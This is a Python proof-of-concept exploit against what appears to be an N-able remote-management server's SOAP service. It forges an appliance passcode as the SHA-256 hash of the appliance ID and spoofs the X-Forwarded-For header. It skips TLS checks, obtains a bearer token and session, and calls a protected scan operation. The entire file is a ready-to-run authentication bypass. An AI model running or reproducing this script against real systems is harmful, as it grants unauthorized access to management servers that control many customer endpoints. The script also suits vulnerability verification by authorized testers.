#!/usr/bin/env python3
import argparse
import base64
import hashlib
import json
import xml.etree.ElementTree as ET

import requests
import urllib3


SOAP = "http://www.w3.org/2003/05/soap-envelope"
MMS = "http://mms3.nobj.nable.com/"


def wrap(inner):
    return f'<soap:Envelope xmlns:soap="{SOAP}" xmlns:m="{MMS}"><soap:Body>{inner}</soap:Body></soap:Envelope>'


def result(body, operation):
    root = ET.fromstring(body)
    return root.findtext(f'.//{{*}}{operation}Response/{{*}}return') or ""


def jwt_id(token):
    encoded = token.split(".")[1]
    encoded += "=" * (-len(encoded) % 4)
    return json.loads(base64.urlsafe_b64decode(encoded))["jti"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--appliance-id", type=int, required=True)
    parser.add_argument("--hardware-id", default="operator-client")
    parser.add_argument("--source-ip", default="192.168.1.145")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    url = args.target.rstrip("/") + "/dms2/services2/ServerMMS3"
    http = requests.Session()
    http.verify = False
    http.headers.update({"Content-Type": "application/soap+xml; charset=UTF-8",
                         "X-Forwarded-For": args.source_ip})

    def post(inner, token=None, sid=None):
        headers = {}
        if token:
            headers["Authorization"] = "Bearer " + token
        if sid:
            headers["X-Session-Id"] = str(sid)
        return http.post(url, data=wrap(inner), headers=headers, timeout=45)

    invalid = post(f'<m:AcquireToken><m:applianceId>{args.appliance_id}</m:applianceId>'
                   f'<m:passcode>{"0" * 64}</m:passcode>'
                   f'<m:hardwareId>{args.hardware_id}-invalid</m:hardwareId></m:AcquireToken>')
    if invalid.status_code < 400 or "Invalid passcode" not in invalid.text:
        raise RuntimeError("wrong-passcode control failed")
    print(f"wrong_passcode_http={invalid.status_code}")

    passcode = hashlib.sha256(str(args.appliance_id).encode()).hexdigest()
    acquired = post(f'<m:AcquireToken><m:applianceId>{args.appliance_id}</m:applianceId>'
                    f'<m:passcode>{passcode}</m:passcode>'
                    f'<m:hardwareId>{args.hardware_id}</m:hardwareId></m:AcquireToken>')
    acquired.raise_for_status()
    print(f"acquire_http={acquired.status_code}")
    token = result(acquired.content, "AcquireToken")
    confirmed = post(f'<m:ConfirmTokenReceived><m:jwtId>{jwt_id(token)}</m:jwtId></m:ConfirmTokenReceived>')
    confirmed.raise_for_status()
    print(f"confirm_http={confirmed.status_code}")
    hello = post('<m:SessionHello><m:version>2.0.0</m:version>'
                 '<m:applianceVersion>1.0.0.0</m:applianceVersion>'
                 '<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>'
                 '<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello>', token)
    hello.raise_for_status()
    print(f"session_hello_http={hello.status_code}")
    sid = result(hello.content, "SessionHello")
    try:
        protected = post('<m:ScanModuleCount/>', token, sid)
        protected.raise_for_status()
        print(f"scan_module_count_http={protected.status_code}")
        return 0
    finally:
        post('<m:SessionQuit><m:shutdown>false</m:shutdown></m:SessionQuit>', token, sid)


if __name__ == "__main__":
    raise SystemExit(main())
